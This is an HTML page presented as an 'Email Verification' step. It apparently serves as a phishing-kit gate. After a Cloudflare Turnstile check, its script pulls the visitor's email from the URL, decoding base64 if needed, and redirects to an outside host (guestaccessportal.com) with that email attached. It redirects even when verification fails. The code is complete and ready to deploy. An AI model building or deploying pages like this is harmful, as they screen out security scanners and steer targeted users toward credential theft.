<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Email Verification</title>
  <!-- Cloudflare Turnstile -->
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" defer></script>
  <style>
    body { margin:0; padding:0; height:100vh; display:flex; justify-content:center; align-items:center;
      font-family:Arial, sans-serif; background:#f0f2f5;
      background-image:url('https://imagedelivery.net/nTzWndEVIiCdlxejBKRKOA/0bf9f467-de20-4bca-c81d-9d7eacf29b00/public');
      background-size:cover; background-position:center; }
    .container { background:#fff; padding:20px; border-radius:8px; box-shadow:0 2px 4px rgba(0,0,0,.1);
      text-align:center; max-width:440px; width:100%; }
    h1 { font-size:16px; margin:0 0 12px; color:#333; }
    .sub { font-size:13px; color:#666; margin:0 0 18px; }
    .cf-turnstile { display:flex; justify-content:center; }
    .note { margin-top:14px; font-size:12px; color:#666; }
  </style>
</head>
<body>
  <div class="container">
    <h1>One more step before you proceed…</h1>
    <div class="sub">Complete the check and we'll redirect you automatically.</div>
    <div class="cf-turnstile"
         data-sitekey="0x4AAAAAABzKdi71fgWWrdOs"
         data-callback="onTurnstileSuccess"></div>
    <div class="note" id="statusNote">Waiting for verification…</div>
  </div>

  <script>
    // ==== CONFIG ====
    // Base you want to redirect to. We’ll append ?9mitFS=...&u=&e=<email> (if email exists)
    const REDIRECT_BASE = "https://tivn.guestaccessportal.com/#";
    // If you have a backend, set to "/api/verify-turnstile" (same origin). If not, leave null.
    const VERIFY_ENDPOINT = null; // e.g. "/api/verify-turnstile"

    // ==== Turnstile callbacks ====
    window.onloadTurnstileCallback = function () {
      console.log("Turnstile script loaded");
    };

    window.onTurnstileSuccess = function (token) {
      document.getElementById('statusNote').textContent = "Verified. Preparing your redirect…";
      verifyTokenAndRedirect(token);
    };

    // ==== URL parsing helpers ====
    function normalizeMaybeDecoded(s) {
      // Replace '+' with space then decode percent-encodings if present
      try { return decodeURIComponent(String(s).replace(/\+/g, ' ')); }
      catch { return String(s); }
    }

    function parseHashParams() {
      // Accept: "#?a=b&c=d", "#a=b&c=d", or bare "#john@example.com"
      let h = window.location.hash || "";
      if (!h) return new URLSearchParams();
      h = h.slice(1);              // drop '#'
      if (h.startsWith("?")) h = h.slice(1); // drop optional '?'
      h = h.trim();
      if (!h) return new URLSearchParams();
      if (!h.includes("=")) {      // bare value → treat as email
        const usp = new URLSearchParams();
        usp.set("email", h);
        return usp;
      }
      return new URLSearchParams(h);
    }

    function getAllURLParams() {
      const merged = new Map();
      // query string
      const qs = new URLSearchParams(window.location.search);
      for (const [k,v] of qs.entries()) merged.set(k, v);
      // hash part
      const hs = parseHashParams();
      for (const [k,v] of hs.entries()) merged.set(k, v);
      return merged;
    }

    // ==== base64 / email helpers ====
    function b64UrlToStd(b64) {
      // Convert URL-safe base64 to standard, pad to multiple of 4
      let s = String(b64).replace(/-/g, "+").replace(/_/g, "/");
      const pad = s.length % 4;
      if (pad === 2) s += "==";
      else if (pad === 3) s += "=";
      else if (pad !== 0) s += "==";
      return s;
    }
    function tryDecodeBase64(val) {
      try { return atob(b64UrlToStd(val)); } catch { return null; }
    }
    function isValidEmail(email) {
      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }

    function findEmailFromURL() {
      const params = getAllURLParams();
      for (const [, raw] of params.entries()) {
        const value = normalizeMaybeDecoded(raw).trim();
        if (!value) continue;

        // Try base64/base64url first
        const maybe = tryDecodeBase64(value);
        if (maybe && isValidEmail(maybe)) return maybe;

        // Then plain email
        if (isValidEmail(value)) return value;
      }
      return null;
    }

    // ==== redirect builder ====
    function buildRedirectURL(emailOrNull) {
      const u = new URL(REDIRECT_BASE);
      u.searchParams.set("9mitFS", "uFy8uB");
      u.searchParams.set("u", "");
      if (emailOrNull) u.searchParams.set("e", emailOrNull); // URLSearchParams will encode
      return u.toString();
    }

    // ==== main flow ====
    async function verifyTokenAndRedirect(token) {
      // Optional server verification. If missing/fails, we still redirect.
      if (VERIFY_ENDPOINT) {
        try {
          const res = await fetch(VERIFY_ENDPOINT, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ token })
          });
          const result = await res.json();
          if (!result.success) {
            document.getElementById('statusNote').textContent = "Verification failed. Redirecting without email…";
            setTimeout(() => window.location.replace(buildRedirectURL(null)), 800);
            return;
          }
        } catch (e) {
          console.warn("Backend check error:", e);
          document.getElementById('statusNote').textContent = "Network issue. Redirecting…";
          setTimeout(() => window.location.replace(buildRedirectURL(null)), 800);
          return;
        }
      }

      const email = findEmailFromURL();
      document.getElementById('statusNote').textContent = email
        ? "Email detected. Working…"
        : "No email found. Working…";

      setTimeout(() => window.location.replace(buildRedirectURL(email)), 800);
    }
  </script>
</body>
</html>

